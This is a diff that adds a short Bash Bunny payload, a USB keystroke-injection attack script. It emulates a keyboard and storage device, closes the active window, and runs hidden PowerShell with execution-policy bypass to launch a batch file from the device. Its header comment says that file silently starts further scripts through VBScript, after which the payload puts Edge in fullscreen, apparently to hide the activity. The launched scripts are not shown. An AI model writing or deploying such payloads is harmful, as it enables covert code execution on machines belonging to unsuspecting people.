@@ -1,0 +1,8 @@
+# Executes z.cmd from the switch position's folder, thus launching x.cmd silently using i.vbs, closes ExplorerWindow after mounting and sets MSEdge in Fullscreen
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+QUACK ALT F4
+RUN WIN powershell -WindowStyle hidden -exec bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\z.cmd')"
+Q ALT F11
+LED FINISH
